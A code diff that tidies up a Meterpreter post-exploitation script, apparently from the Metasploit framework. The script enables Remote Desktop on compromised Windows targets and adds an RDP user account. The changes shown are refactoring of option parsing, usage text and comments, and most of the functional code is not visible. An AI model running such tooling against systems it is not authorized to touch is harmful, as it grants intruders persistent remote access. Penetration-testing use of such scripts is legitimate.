@@ -1,20 +1,28 @@
 # $Id:$
 #
-#Meterpreter script for enabling Remote Desktop on Windows 2003, Windows Vista
-#Windows 2008 and Windows XP targets using native windows commands.
-#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.1.1
-#Note: Port Forwarding option provided by Natron at natron[at]invisibledenizen.org
+# Meterpreter script for enabling Remote Desktop on Windows 2003, Windows Vista
+# Windows 2008 and Windows XP targets using native windows commands.
+# Provided by Carlos Perez at carlos_perez[at]darkoperator.com
+# Version: 0.1.1
+# Note: Port Forwarding option provided by Natron at natron[at]invisibledenizen.org
 #      We are still working in making this option more stable.
 ################## Variable Declarations ##################
 
 session = client
 @@exec_opts = Rex::Parser::Arguments.new(
-		"-h" => [ false,  "Help menu."                        ],
-		"-e" => [ false,  "Enable RDP only."  ],
-		"-p" => [ true,  "The Password of the user to add."  ],
-       		"-u" => [ true,  "The Username of the user to add."  ]
-		)
+	"-h" => [ false, "Help menu." ],
+	"-e" => [ false, "Enable RDP only." ],
+	"-p" => [ true,  "The Password of the user to add." ],
+	"-u" => [ true,  "The Username of the user to add." ]
+)
+def usage
+	print_line("Windows Remote Desktop Enabler Meterpreter Script")
+	print_line("Usage: getgui -u <username> -p <password>")
+	print_line("Or:    getgui -e")
+	print(@@exec_opts.usage)
+	raise Rex::Script::Completed
+end
+
 
 def enablerd(session)
 	key = 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server'
@@ -139,34 +147,26 @@ enbl = nil
 		when "-p"
 			pass = val
 		when "-h"
-			print(
-			"Windows Remote Desktop Enabler Meterpreter Script\n" +
-			"Usage: getgui -u <username> -p <password> \n" +
-			@@exec_opts.usage			
-			)
-			break
+			usage
 		when "-n"
 			lport = val.to_i
 		when "-e"
-			enbl = 1
+			enbl = true
 		end
 
 }
-if enbl == 1
+if enbl
 	message
 	enablerd(session)
 	enabletssrv(session)
 
-elsif usr!= nil && pass != nil
+elsif usr != nil && pass != nil
 	message
 	enablerd(session)
 	enabletssrv(session)
 	addrdpusr(session, usr, pass)
 
 else
-	print(
-		"Windows Remote Desktop Enabler Meterpreter Script\n" +
-		"Usage: getgui -u <username> -p <password> \n" +
-		@@exec_opts.usage)
+	usage
 end
 
